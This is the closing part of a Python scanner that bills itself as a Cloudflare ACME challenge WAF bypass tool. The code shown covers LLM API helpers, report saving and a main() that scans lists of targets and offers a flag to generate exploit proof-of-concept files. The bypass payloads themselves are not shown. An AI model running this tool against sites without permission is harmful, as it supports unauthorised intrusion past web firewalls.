            "Content-Type": "application/json"
        }
        
        data = {
            "model": self.model,
            "messages": [
                {"role": "system", "content": "You are an expert security researcher and penetration tester."},
                {"role": "user", "content": prompt}
            ],
            "temperature": 0.7,
            "max_tokens": 4000
        }
        
        url = self.base_url or "https://api.groq.com/openai/v1/chat/completions"
        
        resp = requests.post(url, headers=headers, json=data, timeout=60)
        resp.raise_for_status()
        
        return resp.json()['choices'][0]['message']['content']
    
    def _call_gemini(self, prompt):
        """Call Google Gemini API"""
        if not self.api_key:
            print(f"{Fore.YELLOW}[!] Gemini API key not found. Set GEMINI_API_KEY env var or use --api-key{Style.RESET_ALL}")
            return None
        
        # Gemini API endpoint format
        base_url = self.base_url or "https://generativelanguage.googleapis.com/v1beta/models"
        url = f"{base_url}/{self.model}:generateContent?key={self.api_key}"
        
        headers = {
            "Content-Type": "application/json"
        }
        
        data = {
            "contents": [{
                "parts": [{
                    "text": f"You are an expert security researcher and penetration tester.\n\n{prompt}"
                }]
            }],
            "generationConfig": {
                "temperature": 0.7,
                "maxOutputTokens": 8192
            }
        }
        
        try:
            resp = requests.post(url, headers=headers, json=data, timeout=120)
            
            if resp.status_code != 200:
                error_detail = resp.text[:500] if resp.text else "No details"
                print(f"{Fore.RED}[!] Gemini API Error {resp.status_code}: {error_detail}{Style.RESET_ALL}")
                return None
            
            result = resp.json()
            return result['candidates'][0]['content']['parts'][0]['text']
        except Exception as e:
            print(f"{Fore.RED}[!] Gemini request failed: {str(e)}{Style.RESET_ALL}")
            return None
    
    def print_analysis(self, analyses, verbose=False):
        """Print LLM analysis results (only if verbose)"""
        if verbose:
            for analysis in analyses:
                print(f"\n{Fore.CYAN}{'='*65}")
                print(f"  LLM ANALYSIS: {analysis['target']}")
                print(f"{'='*65}{Style.RESET_ALL}\n")
                print(analysis['analysis'])
    
    def save_analysis(self, analyses, filename):
        """Save analysis to file"""
        # Buat direktori jika belum ada
        output_dir = os.path.dirname(filename)
        if output_dir and not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        with open(filename, 'w', encoding='utf-8') as f:
            for analysis in analyses:
                f.write(f"# Analysis: {analysis['target']}\n")
                f.write(f"{'='*65}\n\n")
                f.write(analysis['analysis'])
                f.write(f"\n\n{'='*65}\n\n")
        
        print(f"\n{Fore.GREEN}[+] Analysis saved to: {filename}{Style.RESET_ALL}")


def main():
    print(BANNER)
    
    # Load configuration from config.yaml
    config = load_config()
    if config:
        print(f"{Fore.GREEN}[+] Loaded configuration from config.yaml{Style.RESET_ALL}")
    
    parser = argparse.ArgumentParser(
        description='Cloudflare ACME Challenge WAF Bypass Scanner - Based on FearsOff Research',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python scanner.py -u https://target.com
  python scanner.py -l targets.txt -t 5 -o results.json
  python scanner.py -u https://target.com --token "yMnWOcR2yv..." -v
  
  # Generate POC exploits
  python scanner.py -l targets.txt --poc
  
  # Analyze with LLM (uses config.yaml if available)
  python scanner.py -l targets.txt --analyze
  python scanner.py -l targets.txt --analyze --llm openai --api-key sk-xxx
  python scanner.py -l targets.txt --analyze --llm ollama --model llama3.2
  
  # Use custom config file
  python scanner.py -l targets.txt --config my_config.yaml --analyze
  
Reference: https://fearsoff.org/research/cloudflare-acme
        """
    )
    parser.add_argument('-u', '--url', help='Single target URL')
    parser.add_argument('-l', '--list', help='File containing list of targets')
    parser.add_argument('-t', '--threads', type=int, help='Number of threads (default: 10)')
    parser.add_argument('-T', '--timeout', type=int, help='Request timeout (default: 10)')
    parser.add_argument('-d', '--delay', type=float, help='Delay between requests (default: 0)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--token', help='Custom ACME challenge token (default: random)')
    parser.add_argument('--config', help='Path to config file (default: config.yaml)')
    
    # POC Generation arguments
    parser.add_argument('--poc', action='store_true', help='Generate exploit POC files')
    parser.add_argument('--poc-dir', help='Output directory for POC files (default: pocs)')
    
    # LLM Analysis arguments
    parser.add_argument('--analyze', action='store_true', help='Analyze results with LLM')
    parser.add_argument('--llm', choices=['openai', 'anthropic', 'ollama', 'groq', 'gemini'], 
                        help='LLM provider (default from config or openai)')
    parser.add_argument('--api-key', help='API key for LLM provider (overrides config)')
    parser.add_argument('--model', help='LLM model to use (overrides config)')
    parser.add_argument('--llm-url', help='Custom LLM API URL (overrides config)')
    parser.add_argument('--analysis-output', help='Save LLM analysis to file')
    
    args = parser.parse_args()
    
    # Load config from custom path if specified
    if args.config:
        config = load_config(args.config)
        if config:
            print(f"{Fore.GREEN}[+] Loaded configuration from {args.config}{Style.RESET_ALL}")
    
    if not args.url and not args.list:
        parser.print_help()
        print(f"\n{Fore.RED}[!] Please specify a target (-u) or target list (-l){Style.RESET_ALL}")
        return
    
    targets = []
    
    if args.url:
        targets.append(args.url)
    
    if args.list:
        try:
            with open(args.list, 'r') as f:
                targets.extend([line.strip() for line in f if line.strip()])
        except FileNotFoundError:
            print(f"{Fore.RED}[!] File not found: {args.list}{Style.RESET_ALL}")
            return
    
    # Remove duplicates
    targets = list(set(targets))
    
    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    # Get scanner settings from config or args (args override config)
    scanner_config = config.get('scanner', {}) if config else {}
    
    scanner = CloudflareScanner(
        timeout=args.timeout if args.timeout is not None else scanner_config.get('timeout', 10),
        threads=args.threads if args.threads is not None else scanner_config.get('threads', 10),
        delay=args.delay if args.delay is not None else scanner_config.get('delay', 0),
        verbose=args.verbose or scanner_config.get('verbose', False),
        token=args.token
    )
    
    try:
        scanner.scan_targets(targets)
        scanner.print_summary()
        
        # Get output settings from config
        output_config = config.get('output', {}) if config else {}
        
        output_file = args.output or output_config.get('results_file')
        if output_file:
            scanner.save_results(output_file)
        
        # Get POC settings from config
        poc_config = config.get('poc', {}) if config else {}
        
        # Generate POC exploits
        if args.poc or poc_config.get('enabled', False):
            print(f"\n{Fore.CYAN}[*] Generating exploit POCs...{Style.RESET_ALL}")
            poc_gen = POCGenerator(scanner.results)
            poc_dir = args.poc_dir or poc_config.get('output_dir', 'pocs')
            generated_files = poc_gen.generate_all(poc_dir)
            print(f"\n{Fore.GREEN}[+] Generated {len(generated_files)} POC files in '{poc_dir}/' directory{Style.RESET_ALL}")
        
        # LLM Analysis
        if args.analyze:
            # Get LLM settings from config
            llm_config = config.get('llm', {}) if config else {}
            
            # Provider: args > config > default
            llm_provider = args.llm or llm_config.get('provider', 'openai')
            
            print(f"\n{Fore.CYAN}[*] Starting LLM analysis with {llm_provider}...{Style.RESET_ALL}")
            
            analyzer = LLMAnalyzer(
                provider=llm_provider,
                api_key=args.api_key,
                model=args.model,
                base_url=args.llm_url,
                config=config
            )
            
            analyses = analyzer.analyze(scanner.results, verbose=args.verbose)
            
            if analyses:
                # Selalu simpan ke file (default: reports/analysis.md)
                analysis_output = args.analysis_output or output_config.get('analysis_file', 'reports/analysis.md')
                analyzer.save_analysis(analyses, analysis_output)
                
                # Hanya print ke terminal jika verbose
                if args.verbose:
                    analyzer.print_analysis(analyses, verbose=True)
                else:
                    print(f"{Fore.CYAN}[*] {len(analyses)} target(s) analyzed. Details saved to: {analysis_output}{Style.RESET_ALL}")
            
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        scanner.print_summary()


if __name__ == '__main__':
    main()